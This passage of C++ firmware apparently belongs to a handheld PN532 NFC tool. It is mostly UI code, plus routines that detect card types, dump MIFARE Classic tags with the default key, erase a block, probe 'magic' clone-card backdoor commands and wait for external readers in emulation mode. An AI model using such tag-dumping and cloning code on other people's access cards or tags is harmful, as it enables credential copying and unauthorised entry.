    s_featureInfoTitle[sizeof(s_featureInfoTitle) - 1] = '\0';
  }
  if (!body) {
    body = "";
  }
  strncpy(s_featureInfoBody, body, sizeof(s_featureInfoBody) - 1);
  s_featureInfoBody[sizeof(s_featureInfoBody) - 1] = '\0';
  s_featureInfoAvailable = s_featureInfoBody[0] != '\0';
}

static int rfidInfoPanelPageCount(const char* body) {
  return rfidInfoPanelPageCountForLines(body, rfidDetailLinesPerPage());
}

static bool rfidDetailTagNeedsPill(const char* tagLabel) {
  if (!tagLabel || !tagLabel[0]) {
    return false;
  }
  return strcmp(tagLabel, "INFO") != 0 && strcmp(tagLabel, "PROGRESS") != 0 &&
         strcmp(tagLabel, "SCAN") != 0 && strcmp(tagLabel, "RESULT") != 0;
}

static void rfidDrawInfoPanel(const char* tagLabel, const char* body, int page, int pageCount,
                              int linesPerPage) {
  const int detailBottom = rfidDetailBottom();
  const int detailTop = rfidEffectiveDetailTop();
  const int bodyTop = rfidDetailBodyTop();
  tft.fillRect(5, detailTop + kRfidBoxHeaderH, TFT_WIDTH - 10, detailBottom - detailTop - kRfidBoxHeaderH - 1,
               TFT_BLACK);
  tft.setTextFont(1);
  const int tagTop = detailTop + kRfidBoxHeaderH + 2;
  int textTop = bodyTop;
  if (pageCount > 1) {
    tft.fillRoundRect(kRfidDetailPadX, tagTop, 62, RF_TAG_H, 7, DARK_GRAY);
    tft.setTextColor(UI_ICON, DARK_GRAY);
    tft.setCursor(kRfidDetailPadX + 6, tagTop + 3);
    tft.printf("%d/%d", page + 1, pageCount);
    textTop = tagTop + RF_TAG_H + RF_TAG_GAP;
  } else if (rfidDetailTagNeedsPill(tagLabel)) {
    int pillW = (int)tft.textWidth(tagLabel) + 14;
    if (pillW < 48) {
      pillW = 48;
    }
    tft.fillRoundRect(kRfidDetailPadX, tagTop, pillW, RF_TAG_H, 7, DARK_GRAY);
    tft.setTextColor(UI_ICON, DARK_GRAY);
    tft.setCursor(kRfidDetailPadX + 6, tagTop + 3);
    tft.print(tagLabel);
    textTop = tagTop + RF_TAG_H + RF_TAG_GAP;
  }
  rfidPrintWrappedPageBg(kRfidDetailPadX, textTop, kRfidDetailInnerW, body, kRfidLineHeight, UI_TEXT,
                         TFT_BLACK, page * linesPerPage, linesPerPage);
}

static void rfidRefreshInfoPanel(const char* tagLabel, const char* body) {
  (void)tagLabel;
  (void)body;
}

static void rfidDrawHint(bool twoActions, int padX = RF_PAD_X) {
  if (featureHasTouchNavBar()) {
    return;
  }
  const int hintY = rfidHintY();
  tft.fillRect(0, hintY - 3, TFT_WIDTH, 17, FEATURE_BG);
  tft.setTextFont(1);
  tft.setTextColor(UI_DIM_TEXT, FEATURE_BG);
  tft.setCursor(padX, hintY);
  tft.print(twoActions ? "LEFT: Back   SELECT: action" : "LEFT / SELECT: close");
}

static void rfidDynamicBand(int topY, const char* line1, const char* line2) {
  (void)topY;
  const char* l1 = line1 ? line1 : "";
  const char* l2 = line2 ? line2 : "";
  if (strcmp(s_dynPrev1, l1) == 0 && strcmp(s_dynPrev2, l2) == 0 &&
      strcmp(s_dynPrevAux, s_rfidBandAux) == 0 && strcmp(s_dynPrevPill, s_dynPillLabel) == 0) {
    return;
  }

  rfidDrawStaticStatusLines();
  const String modeLine = String("Mode: ") + s_dynPillLabel;
  rfidDrawStatusLineIfChanged(0, modeLine, s_dynPillColor);
  rfidDrawStatusLineIfChanged(1, l1, UI_TEXT);
  rfidDrawStatusLineIfChanged(2, l2, UI_DIM_TEXT);
  if (s_rfidBandAux[0]) {
    rfidDrawStatusLineIfChanged(3, s_rfidBandAux, UI_DIM_TEXT);
  }

  strncpy(s_dynPrev1, l1, sizeof(s_dynPrev1) - 1);
  s_dynPrev1[sizeof(s_dynPrev1) - 1] = '\0';
  strncpy(s_dynPrev2, l2, sizeof(s_dynPrev2) - 1);
  s_dynPrev2[sizeof(s_dynPrev2) - 1] = '\0';
  strncpy(s_dynPrevAux, s_rfidBandAux, sizeof(s_dynPrevAux) - 1);
  s_dynPrevAux[sizeof(s_dynPrevAux) - 1] = '\0';
  strncpy(s_dynPrevPill, s_dynPillLabel, sizeof(s_dynPrevPill) - 1);
  s_dynPrevPill[sizeof(s_dynPrevPill) - 1] = '\0';
}

static void rfidRedrawListenChrome() {
  rfidSetDetailBoxVisible(false);
  rfidDrawTextBoxes();
  rfidRepaintStatusFromCache();
  rfidRedrawActivityLog();
  if (featureHasTouchNavBar() && s_listenCenterLabel[0]) {
    rfidSetListenNavLabels(s_listenCenterLabel, s_featureInfoAvailable);
  }
}

/** Wait for Exit on 2-box chrome; feature info stays on Info nav. */
static void rfidWaitTwoBoxDismiss() {
  rfidSetDetailBoxVisible(false);
  rfidDrawShellFooter1("Exit");
  rfidDrawTextBoxes();
  rfidRepaintStatusFromCache();
  rfidRedrawActivityLog();
  if (featureHasTouchNavBar()) {
    rfidSetListenNavLabels("Exit", s_featureInfoAvailable);
  }

  for (;;) {
    if (rfidPumpSessionUi()) {
      return;
    }
    rfidTryShowInfo();
    if (rfidPollFooter(s_rfFoot, 1, false) != RfidUiEvt::None) {
      return;
    }
    delay(8);
  }
}

/** Timeout dismiss: Exit leaves, Ready retries. @return true when Ready pressed. */
static bool rfidWaitTimeoutDismiss() {
  rfidSetDetailBoxVisible(false);
  FeatureUI::layoutFooter2(s_rfFoot, "Exit", FeatureUI::ButtonStyle::Secondary, "Ready",
                           FeatureUI::ButtonStyle::Primary, false, false);
  rfidDrawTextBoxes();
  rfidRepaintStatusFromCache();
  rfidRedrawActivityLog();
  if (featureHasTouchNavBar()) {
    rfidSetTimeoutNavLabels(s_featureInfoAvailable);
  } else {
    FeatureUI::drawFooterBg();
    FeatureUI::drawButton(s_rfFoot[0]);
    FeatureUI::drawButton(s_rfFoot[1]);
  }

  for (;;) {
    if (rfidPumpSessionUi()) {
      return false;
    }
    rfidTryShowInfo();
    RfidUiEvt e = rfidPollFooter(s_rfFoot, 2, true);
    if (e == RfidUiEvt::Primary) {
      return true;
    }
    if (e == RfidUiEvt::Back) {
      return false;
    }
    delay(8);
  }
}

/** Timeout — stay on 2-box chrome; feature info on Info nav. @return true to retry. */
static bool rfidDismissTimeoutPanel(const char* statusLine, const char* message) {
  rfidSetDynamicPill("WARN", UI_WARN);
  rfidSetBandAux(nullptr);
  rfidDynClearPrev();
  rfidDynamicBand(0, statusLine, "No tag detected");

  String logLine = message;
  const int nl = logLine.indexOf('\n');
  if (nl >= 0) {
    logLine = logLine.substring(0, nl);
  }
  rfidPrint(String("[!] ") + logLine, UI_WARN, false);
  return rfidWaitTimeoutDismiss();
}

static void rfidShowInfoPanel() {
  const bool showTitle = s_featureInfoTitle[0] != '\0';
  const int linesPerPage = rfidInfoOverlayLinesPerPage(showTitle);
  const int pageCount = rfidInfoPanelPageCountForLines(s_featureInfoBody, linesPerPage);
  int page = 0;
  bool redraw = false;
  rfidSetInfoOverlayNavLabels(pageCount);
  rfidDrawInfoOverlay(s_featureInfoTitle, s_featureInfoBody, page, pageCount, linesPerPage);

  for (;;) {
    if (rfidPumpSessionUi()) {
      rfidRedrawListenChrome();
      return;
    }
    if (redraw) {
      rfidDrawInfoOverlay(s_featureInfoTitle, s_featureInfoBody, page, pageCount, linesPerPage);
      redraw = false;
    }

    if (isButtonPressed(BTN_LEFT)) {
      rfidReleaseNavButtons();
      break;
    }
    if (pageCount == 1 && isButtonPressed(BTN_SELECT)) {
      rfidReleaseNavButtons();
      break;
    }
    // Remapped: Prev/Next always sit on UP/DOWN -- UP now goes to the
    // previous page (was Next/page++), DOWN now goes to the next page (was
    // Prev/page--).
    if (pageCount > 1 && isButtonPressed(BTN_UP) && page > 0) {
      rfidReleaseNavButtons();
      page--;
      redraw = true;
      continue;
    }
    if (pageCount > 1 && isButtonPressed(BTN_DOWN) && page < pageCount - 1) {
      rfidReleaseNavButtons();
      page++;
      redraw = true;
      continue;
    }

    if (featureHasTouchNavBar()) {
      if (isTouchNavButtonPressedEdge(BTN_LEFT) || isTouchNavButtonPressedEdge(BTN_SELECT)) {
        rfidReleaseNavButtons();
        break;
      }
      if (pageCount > 1 && isTouchNavButtonPressedEdge(BTN_UP) && page > 0) {
        rfidReleaseNavButtons();
        page--;
        redraw = true;
        continue;
      }
      if (pageCount > 1 && isTouchNavButtonPressedEdge(BTN_DOWN) && page < pageCount - 1) {
        rfidReleaseNavButtons();
        page++;
        redraw = true;
        continue;
      }
    }

    delay(8);
  }

  rfidRedrawListenChrome();
}

static void rfidTryShowInfo() {
  if (!s_featureInfoAvailable || !s_featureInfoBody[0]) {
    return;
  }

  bool open = false;
  if (featureHasTouchNavBar()) {
    if (isTouchNavButtonPressedEdge(BTN_RIGHT)) {
      rfidReleaseNavButtons();
      open = true;
    }
  } else if (isButtonPressed(BTN_RIGHT)) {
    rfidReleaseNavButtons();
    open = true;
  }
  if (!open) {
    return;
  }

  rfidShowInfoPanel();
}

static void rfidListenTick(const char* statusLine, unsigned long t0) {
  const char* spin = "|/-\\";
  unsigned sec = (unsigned)((millis() - t0) / 1000UL);
  char detail[40];
  if (sec != s_listenSec) {
    s_listenSec = sec;
    snprintf(detail, sizeof(detail), "%u s", sec);
  } else {
    if (millis() - s_listenSpinMs > 320) {
      s_listenSpin = (uint8_t)((s_listenSpin + 1) % 4);
      s_listenSpinMs = millis();
    }
    snprintf(detail, sizeof(detail), "%u s  %c", sec, spin[s_listenSpin]);
  }
  rfidDynamicBand(0, statusLine, detail);
}

/** Full chrome once — listening: NFC Status + Activity (info via nav button). */
static void rfidShellListen(const char* title, const char* footerLabel, const char* infoBody) {
  rfidListenShellReset();
  rfidDynClearPrev();
  rfidSetDynamicPill("SCAN", UI_WARN);
  rfidFeatureSetup(title);
  rfidSetDetailBoxVisible(false);
  const char* sub = (s_pn532VerStr[0] != '\0') ? s_pn532VerStr : nullptr;
  rfidSetBandAux(sub);
  const char* info = (infoBody && infoBody[0]) ? infoBody : "Waiting for tag...";
  rfidSetFeatureInfo(title, info);
  rfidDrawShellFooter1(footerLabel);
  rfidDrawHint(false);
  rfidDrawStaticStatusLines();
  rfidDynamicBand(0, "Ready", "");
  rfidPrint("[*] Waiting for tag...", UI_DIM_TEXT, false);
}

/** Full chrome once — progress: NFC Status + Activity (info via nav button). */
static void rfidShellProgress(const char* mainTitle, const char* stepLine, const char* footerLabel,
                              const char* infoBody = nullptr) {
  rfidListenShellReset();
  rfidDynClearPrev();
  rfidSetDynamicPill("WORK", UI_OK);
  rfidFeatureSetup(mainTitle);
  rfidSetDetailBoxVisible(false);
  rfidDrawTextBoxes();
  rfidSetBandAux(stepLine);
  const char* info = (infoBody && infoBody[0]) ? infoBody : stepLine;
  rfidSetFeatureInfo(mainTitle, info);
  rfidDrawShellFooter1(footerLabel);
  rfidDrawHint(false);
  rfidDrawStaticStatusLines();
  rfidDynamicBand(0, stepLine, "");
  rfidPrint(String("[!] ") + stepLine, UI_TEXT, false);
  rfidRedrawNavChrome();
}

/** Switch listen → progress without wiping chrome or activity log. */
static void rfidTransitionToProgress(const char* title, const char* stepLine, const char* footerLabel,
                                     const char* infoBody) {
  (void)infoBody;
  if (title && title[0]) {
    rfidUpdateToolbarTitle(title);
  }
  rfidListenShellReset();
  rfidDynClearPrev();
  rfidSetDynamicPill("WORK", UI_OK);
  rfidSetDetailBoxVisible(false);
  rfidSetBandAux(stepLine);
  rfidDrawShellFooter1(footerLabel);
  rfidDrawTextBoxes();
  rfidDrawStaticStatusLines();
  rfidDynamicBand(0, stepLine, "");
  rfidPrint(String("[!] ") + stepLine, UI_TEXT, false);
}

static void rfidLayoutFull(const char* title, const char* subtitleOrNull, const char* body,
                           bool twoButtons, const char* primaryLabel,
                           FeatureUI::ButtonStyle primaryStyle, bool primaryDisabled) {
  applyThemeToPalette(settings().theme);
  rfidResetUiState();
  rfidClearBody(TFT_BLACK);
  drawStatusBar(readBatteryVoltage(), true);
  s_rfidBandAux[0] = '\0';
  rfidRunToolbar(title);

  const int boxY = kRfidStatusY;
  const int boxBottom = rfidDetailBottom();
  const int boxH = boxBottom - boxY;
  if (boxH > 12) {
    tft.drawRoundRect(4, boxY, TFT_WIDTH - 8, boxH, 3, UI_LINE);
    tft.setTextSize(1);
    tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
    tft.drawString("Details", 8, boxY + 3);
    const int innerX = kRfidDetailPadX;
    const int innerW = kRfidDetailInnerW;
    const bool hasSub = subtitleOrNull && subtitleOrNull[0];
    int tagTop = boxY + kRfidBoxHeaderH + 4;
    int bodyTop = tagTop + RF_TAG_H + RF_TAG_GAP;
    if (hasSub) {
      tft.setTextFont(1);
      tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
      String sub = subtitleOrNull;
      const bool wasLong = tft.textWidth(sub) > innerW;
      while (sub.length() > 0 && tft.textWidth(wasLong ? sub + "..." : sub) > innerW) {
        sub.remove(sub.length() - 1);
      }
      if (wasLong) {
        sub += "...";
      }
      tft.setCursor(innerX, boxY + kRfidBoxHeaderH + 2);
      tft.print(sub);
      tagTop = boxY + kRfidBoxHeaderH + 16;
      bodyTop = tagTop + RF_TAG_H + RF_TAG_GAP;
    }
    const char* tag = (primaryStyle == FeatureUI::ButtonStyle::Danger) ? "CAUTION" : "DETAILS";
    tft.setTextFont(1);
    tft.fillRoundRect(innerX, tagTop, 52, RF_TAG_H, 7, DARK_GRAY);
    tft.setTextColor(UI_ICON, DARK_GRAY);
    tft.setCursor(innerX + 6, tagTop + 3);
    tft.print(tag);
    rfidPrintWrappedStepBg(innerX, bodyTop, innerW, body, RF_BODY_LINE_PX, UI_TEXT, TFT_BLACK,
                           boxBottom - 4);
  }

  rfidRedrawNavChrome();

  if (twoButtons && primaryLabel) {
    rfidDrawShellFooter2(primaryLabel, primaryStyle, primaryDisabled);
    rfidDrawHint(true);
  } else {
    rfidDrawShellFooter1("Back");
    rfidDrawHint(false);
  }
}

static bool rfidSubtitleIsFailure(const char* sub) {
  if (!sub || !sub[0]) {
    return false;
  }
  return strstr(sub, "fail") || strstr(sub, "Fail") || strstr(sub, "Timeout") ||
         strstr(sub, "Skipped") || strstr(sub, "No tag") || strstr(sub, "Unsupported") ||
         strstr(sub, "Aborted") || strstr(sub, "Stopped") || strstr(sub, "No write") ||
         strstr(sub, "lost") || strstr(sub, "Lost") || strstr(sub, "Incomplete");
}

/** Result dismiss: Exit only on success; Exit + Ready when failed. */
static void rfidWaitResultDismiss(bool offerRetry) {
  if (offerRetry) {
    if (rfidWaitTimeoutDismiss()) {
      s_rfidRetrySession = true;
    }
    return;
  }
  rfidWaitTwoBoxDismiss();
}

static void rfidPresentResult(const char* title, const char* sub, const char* body,
                              const char* detailTag = "RESULT", const char* pillLabel = nullptr) {
  (void)detailTag;
  if (!s_rfidBoxesDrawn) {
    rfidFeatureSetup(title ? title : "RFID");
  } else if (title && title[0]) {
    rfidUpdateToolbarTitle(title);
  }

  rfidListenShellReset();
  rfidDynClearPrev();

  const bool failed = rfidSubtitleIsFailure(sub);
  if (pillLabel && pillLabel[0]) {
    rfidSetDynamicPill(pillLabel, failed ? UI_WARN : UI_OK);
  } else {
    rfidSetDynamicPill(failed ? "WARN" : "DONE", failed ? UI_WARN : UI_OK);
  }
  rfidSetBandAux(nullptr);
  rfidDrawStaticStatusLines();
  rfidDynamicBand(0, title ? title : "Done", sub && sub[0] ? sub : "Complete");
  if (sub && sub[0]) {
    rfidPrint(String("[") + (failed ? "!" : "+") + "] " + sub, failed ? UI_WARN : UI_OK, false);
  }
  if (body && body[0]) {
    String remaining = body;
    int lines = 0;
    while (remaining.length() > 0 && lines < 8) {
      const int nl = remaining.indexOf('\n');
      String line = (nl >= 0) ? remaining.substring(0, nl) : remaining;
      remaining = (nl >= 0) ? remaining.substring(nl + 1) : "";
      line.trim();
      if (line.length() > 0) {
        rfidPrint(line, failed ? UI_WARN : UI_TEXT, false);
        lines++;
      }
    }
  }
  rfidWaitResultDismiss(failed);
}

static void rfidResultAndDismiss(const char* title, const char* sub, const char* body) {
  rfidPresentResult(title, sub, body);
}

/** @return true = primary (right) action, false = back */
static bool rfidRunTwoButtonDialog(const char* title, const char* sub, const char* body,
                                   const char* primaryLabel, FeatureUI::ButtonStyle primaryStyle) {
  rfidLayoutFull(title, sub, body, true, primaryLabel, primaryStyle, false);
  for (;;) {
    if (rfidPumpSessionUi()) {
      return false;
    }
    RfidUiEvt e = rfidPollFooter(s_rfFoot, 2, true);
    if (e == RfidUiEvt::Back) {
      return false;
    }
    if (e == RfidUiEvt::Primary) {
      return true;
    }
    delay(8);
  }
}

/** 2-box confirm: Back cancels, primary continues. */
static bool rfidRunTwoBoxConfirm(const char* title, const char* statusLine, const char* statusDetail,
                                 const char* activityMsg, const char* infoBody,
                                 const char* primaryLabel) {
  rfidListenShellReset();
  rfidDynClearPrev();
  rfidSetDynamicPill("READY", UI_OK);
  rfidFeatureSetup(title);
  rfidSetDetailBoxVisible(false);
  rfidSetFeatureInfo(title, infoBody ? infoBody : statusLine);
  rfidSetBandAux(nullptr);
  rfidDynamicBand(0, statusLine, statusDetail ? statusDetail : "");
  if (activityMsg && activityMsg[0]) {
    rfidPrint(activityMsg, UI_TEXT, false);
  }
  rfidDrawShellFooter2(primaryLabel, FeatureUI::ButtonStyle::Primary, false);
  rfidDrawHint(true);

  for (;;) {
    if (rfidPumpSessionUi()) {
      return false;
    }
    rfidTryShowInfo();
    RfidUiEvt e = rfidPollFooter(s_rfFoot, 2, true);
    if (e == RfidUiEvt::Back) {
      return false;
    }
    if (e == RfidUiEvt::Primary) {
      return true;
    }
    delay(8);
  }
}

static bool rfidPollListenUi() {
  if (rfidPumpSessionUi()) {
    return true;
  }
  rfidTryShowInfo();
  return rfidPollFooter(s_rfFoot, 1, false) != RfidUiEvt::None;
}

static bool rfidPollCancel() {
  return rfidPollListenUi();
}

static bool tryMagicBackdoor() {
  uint8_t commands[][2] = {{0x40, 0x00}, {0x43, 0x00}};
  uint8_t response[32];
  uint8_t responseLength = 32;
  for (int i = 0; i < 2; i++) {
    if (s_nfc.inDataExchange(commands[i], sizeof(commands[i]), response, &responseLength)) {
      return true;
    }
  }
  return false;
}

/** True if the same ISO14443A tag is still on the coil (short poll). */
static bool rfidTagStillPresent(const uint8_t* uid, uint8_t uidLen) {
  uint8_t uidNow[7] = {0};
  uint8_t lenNow = 0;
  if (!s_nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uidNow, &lenNow, 80)) {
    return false;
  }
  if (lenNow != uidLen) {
    return false;
  }
  return memcmp(uid, uidNow, uidLen) == 0;
}

static bool rfidDumpTagLost(const uint8_t* uid, uint8_t uidLen, unsigned blockOrPage) {
  if (rfidTagStillPresent(uid, uidLen)) {
    return false;
  }
  rfidRestoreBus();
  char body[160];
  snprintf(body, sizeof(body),
           "Tag left the field during dump\n(at block/page %u).\n\n"
           "Keep the tag on the coil until reading finishes.",
           blockOrPage);
  rfidResultAndDismiss("Dump", "Tag lost", body);
  return true;
}

static CardType detectCardType(uint8_t* uid, uint8_t uidLength) {
  if (uidLength != 4 && uidLength != 7) {
    return UNKNOWN;
  }
  uint8_t keyA[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  if (s_nfc.mifareclassic_AuthenticateBlock(uid, uidLength, 0, 0, keyA)) {
    return MIFARE_CLASSIC;
  }
  uint8_t data[16];
  if (s_nfc.mifareultralight_ReadPage(4, data)) {
    uint8_t cmd[] = {0x60};
    uint8_t response[32];
    uint8_t responseLength = 32;
    if (s_nfc.inDataExchange(cmd, sizeof(cmd), response, &responseLength) &&
        responseLength >= 8) {
      if (response[0] == 0x00 && response[1] == 0x04) {
        return NTAG;
      }
    }
    return MIFARE_ULTRALIGHT;
  }
  uint8_t cmd[] = {0x5A, 0x00, 0x00, 0x00};
  uint8_t response[32];
  uint8_t responseLength = 32;
  if (s_nfc.inDataExchange(cmd, sizeof(cmd), response, &responseLength) && responseLength > 0) {
    return MIFARE_DESFIRE;
  }
  return UNKNOWN;
}

static const char* cardTypeStr(CardType t) {
  switch (t) {
    case MIFARE_CLASSIC:
      return "MIFARE Classic";
    case MIFARE_ULTRALIGHT:
      return "Ultralight";
    case NTAG:
      return "NTAG";
    case MIFARE_DESFIRE:
      return "DESFire";
    default:
      return "Unknown";
  }
}

static void uidToHex(char* out, size_t outLen, uint8_t* uid, uint8_t uidLen) {
  size_t pos = 0;
  out[0] = '\0';
  for (uint8_t i = 0; i < uidLen && i < 7u && pos + 3 < outLen; i++) {
    pos += (size_t)snprintf(out + pos, outLen - pos, "%02X", uid[i]);
  }
}

static void formatClassicBlock0(char* out, size_t outLen, const uint8_t* d) {
  snprintf(out, outLen,
           "Sector 0 block 0 (read with key A = FF FF FF FF FF FF):\n"
           "%02X %02X %02X %02X %02X %02X %02X %02X\n"
           "%02X %02X %02X %02X %02X %02X %02X %02X",
           d[0], d[1], d[2], d[3], d[4], d[5], d[6], d[7], d[8], d[9], d[10], d[11], d[12], d[13],
           d[14], d[15]);
}

namespace RfidNfc {

bool begin() {
  if (s_hwOk) {
    return true;
  }
  rfidAttachBus();
  s_nfc.begin();
  uint32_t ver = s_nfc.getFirmwareVersion();
  if (!ver) {
    rfidPn532VerStr(0);
    restoreSdAfterSharedSpi();
    return false;
  }
  rfidPn532VerStr(ver);
  s_nfc.SAMConfig();
  s_nfc.setPassiveActivationRetries(0xFF);
  s_hwOk = true;
  restoreSdAfterSharedSpi();
  return true;
}

bool hardwareOk() { return s_hwOk; }

/** Clear retry flag before starting a session (menu loop). */
void clearSessionRetry() { s_rfidRetrySession = false; }

/** @return true once if the user chose Ready on a failure result screen. */
bool consumeSessionRetry() {
  if (!s_rfidRetrySession) {
    return false;
  }
  s_rfidRetrySession = false;
  return true;
}

void resetCloneBuffer() {}

static bool rfidTargetSendResponse(const uint8_t* payload, uint8_t payloadLen) {
  uint8_t tx[64];
  if (payloadLen + 1u > sizeof(tx)) {
    payloadLen = (uint8_t)(sizeof(tx) - 1u);
  }
  tx[0] = 0x8E;
  memcpy(tx + 1, payload, payloadLen);
  return s_nfc.setDataTarget(tx, (uint8_t)(payloadLen + 1u)) != 0;
}

/** Wait until an external reader polls us in ISO14443A target mode. */
static bool rfidTargetWaitReader(const char* tickMsg, unsigned long timeoutMs, uint8_t* rx,
                                 uint8_t* rxLen, bool showWaitLog) {
  for (;;) {
    unsigned long t0 = millis();
    if (showWaitLog) {
      rfidListenShellReset();
      rfidPrint("[*] Waiting for external reader...", UI_DIM_TEXT, false);
    }

    for (;;) {
      if (rfidPumpSessionUi()) {
        return false;
      }
      if (rfidPollCancel()) {
        return false;
      }
      rfidListenTick(tickMsg, t0);

      if (s_nfc.AsTarget()) {
        const uint8_t maxLen = *rxLen;
        *rxLen = maxLen;
        if (s_nfc.getDataTarget(rx, rxLen)) {
          Serial.printf("EMUL: leitor respondeu (len=%u)\n", (unsigned)*rxLen);
          return true;
        }
      }

      if (timeoutMs > 0 && (millis() - t0) >= timeoutMs) {
        char tmsg[128];
        snprintf(tmsg, sizeof(tmsg),
                 "No external reader in %lu s.\nTap Ready to wait again.",
                 timeoutMs / 1000UL);
        if (!rfidDismissTimeoutPanel("Timeout", tmsg)) {
          return false;
        }
        rfidPrint("[*] Ready — waiting for reader...", UI_DIM_TEXT, false);
        break;
      }
      delay(25);
    }
  }
}

static bool rfidListenIso14443a(const char* title, const char* footer, uint8_t* uid,
                                uint8_t* uidLenOut, unsigned long timeoutMs, const char* tickMsg,
                                const char* infoBody = nullptr) {
  const char* info = (infoBody && infoBody[0]) ? infoBody : tickMsg;
  for (;;) {
    unsigned long t0 = millis();
    rfidShellListen(title, footer, info);
    for (;;) {
      if (rfidPumpSessionUi()) {
        return false;
      }
      rfidListenTick(tickMsg, t0);
      if (rfidPollCancel()) {
        return false;
      }
      if (s_nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, uidLenOut, 150)) {
        return true;
      }
      if (millis() - t0 > timeoutMs) {
        char tmsg[96];
        snprintf(tmsg, sizeof(tmsg),
                 "No ISO14443A tag in %lu s.\nTap Ready to listen again.",
                 (unsigned long)(timeoutMs / 1000UL));
        if (!rfidDismissTimeoutPanel("Timeout", tmsg)) {
          return false;
        }
        rfidPrint("[*] Ready — listening again...", UI_DIM_TEXT, false);
        break;
      }
      delay(12);
    }
  }
}

void sessionErase() {
  static const char kIntro[] =
      "Clears MIFARE Classic data block 4 (16 bytes to 00) using default key A.\n\n"
      "Ultralight / NTAG are not erased by this mode.\n\n"
      "Hold a Classic tag on the coil.";

  rfidAttachBus();
  uint8_t uid[7] = {0};
  uint8_t uidLength = 0;
  if (!rfidListenIso14443a("Erase", "Cancel", uid, &uidLength, (unsigned long)RFID_TAG_LISTEN_TIMEOUT_MS,
                           "Classic tag — block 4 erase", kIntro)) {
    rfidRestoreBus();
    return;
  }

  char uidStr[24] = "";
  uidToHex(uidStr, sizeof(uidStr), uid, uidLength);
  rfidSetDynamicPill("OK", UI_OK);
  rfidSetBandAux(nullptr);
  rfidDynamicBand(0, "Tag detected", uidStr);
  rfidPrint(String("[+] Tag detected ") + uidStr, UI_OK, false);

  CardType ct = detectCardType(uid, uidLength);
  if (ct != MIFARE_CLASSIC) {
    rfidRestoreBus();
    rfidPresentResult("Erase", "Skipped", "This erase only targets MIFARE Classic.");
    return;
  }

  uint8_t keyA[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  uint8_t emptyBlock[16] = {0};
  if (!s_nfc.mifareclassic_AuthenticateBlock(uid, uidLength, 4, 0, keyA)) {
    rfidRestoreBus();
    rfidResultAndDismiss("Erase", "Auth failed", "Could not authenticate block 4 with key A.");
    return;
  }
  if (!s_nfc.mifareclassic_WriteDataBlock(4, emptyBlock)) {
    rfidRestoreBus();
    rfidResultAndDismiss("Erase", "Write failed", "Block 4 write was rejected.");
    return;
  }

  rfidRestoreBus();
  char body[180];
  snprintf(body, sizeof(body), "UID %s\nBlock 4 cleared (16 bytes zero).", uidStr);
  rfidResultAndDismiss("Erase", "Done", body);
}

void sessionDump() {
  static const char kIntro[] =
      "Reads Classic blocks 0–63 or UL/NTAG user pages.\n\n"
      "Summary here; full hex prints on Serial Monitor.\n\n"
      "Present tag on the coil.";

  rfidAttachBus();
  uint8_t uid[7] = {0};
  uint8_t uidLength = 0;
  if (!rfidListenIso14443a("Dump", "Cancel", uid, &uidLength, (unsigned long)RFID_TAG_LISTEN_TIMEOUT_MS,
                           "Present tag to dump", kIntro)) {
    rfidRestoreBus();
    return;
  }

  char uidStr[24] = "";
  uidToHex(uidStr, sizeof(uidStr), uid, uidLength);
  CardType ct = detectCardType(uid, uidLength);
  rfidSetDynamicPill("OK", UI_OK);
  rfidSetBandAux(nullptr);
  rfidDynamicBand(0, "Tag detected", uidStr);
  rfidPrint(String("[+] Tag detected ") + uidStr, UI_OK, false);

  uint8_t keyA[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  uint8_t data[16];
  int blocksWithData = 0;
  int blocksRead = 0;
  int segmentsExpected = 0;

  if (ct == MIFARE_CLASSIC) {
    segmentsExpected = 64;
    rfidTransitionToProgress("Dump", "Reading Classic blocks", "Cancel",
                             "Reading MIFARE Classic blocks 0–63.\nFull hex on Serial Monitor.");
    Serial.println(F("\n--- RFID Dump Classic ---"));
    for (uint8_t block = 0; block < 64; block++) {
      char l2[48];
      snprintf(l2, sizeof(l2), "Block %u / 63", (unsigned)block);
      rfidDynamicBand(RF_DYN_TOP_PROG, "Dumping MIFARE Classic", l2);
      char infoLine[72];
      snprintf(infoLine, sizeof(infoLine), "Reading block %u of 63.\nFull hex on Serial Monitor.",
               (unsigned)block);
      rfidRefreshInfoPanel("PROGRESS", infoLine);
      if (rfidPollCancel()) {
        rfidRestoreBus();
        if (!rfidSessionExitRequested()) {
          rfidResultAndDismiss("Dump", "Stopped", "Dump aborted.");
        }
        return;
      }
      const bool ok = s_nfc.mifareclassic_AuthenticateBlock(uid, uidLength, block, 0, keyA) &&
                      s_nfc.mifareclassic_ReadDataBlock(block, data);
      if (ok) {
        blocksRead++;
        bool nz = false;
        for (int i = 0; i < 16; i++) {
          if (data[i] != 0) {
            nz = true;
          }
        }
        if (nz) {
          blocksWithData++;
        }
        Serial.printf("B%u:", (unsigned)block);
        for (int i = 0; i < 16; i++) {
          Serial.printf(" %02X", data[i]);
        }
        Serial.println();
      } else if (rfidDumpTagLost(uid, uidLength, (unsigned)block)) {
        return;
      }
      delay(25);
    }
  } else if (ct == MIFARE_ULTRALIGHT || ct == NTAG) {
    uint8_t maxPages = (ct == MIFARE_ULTRALIGHT) ? 16u : 36u;
    segmentsExpected = (int)maxPages - 4;
    rfidTransitionToProgress("Dump", "Reading user pages", "Cancel",
                             "Reading Ultralight / NTAG user pages.\nFull hex on Serial Monitor.");
    Serial.println(F("\n--- RFID Dump Ultralight / NTAG ---"));
    for (uint8_t page = 4; page < maxPages; page++) {
      char l2[48];
      snprintf(l2, sizeof(l2), "Page %u / %u", (unsigned)page, (unsigned)(maxPages - 1));
      rfidDynamicBand(RF_DYN_TOP_PROG, "Dumping pages", l2);
      char infoLine[72];
      snprintf(infoLine, sizeof(infoLine), "Reading page %u of %u.\nFull hex on Serial Monitor.",
               (unsigned)page, (unsigned)(maxPages - 1));
      rfidRefreshInfoPanel("PROGRESS", infoLine);
      if (rfidPollCancel()) {
        rfidRestoreBus();
        if (!rfidSessionExitRequested()) {
          rfidResultAndDismiss("Dump", "Stopped", "Dump aborted.");
        }
        return;
      }
      uint8_t pg[4];
      if (s_nfc.mifareultralight_ReadPage(page, pg)) {
        blocksRead++;
        bool nz = false;
        for (int i = 0; i < 4; i++) {
          if (pg[i] != 0) {
            nz = true;
          }
        }
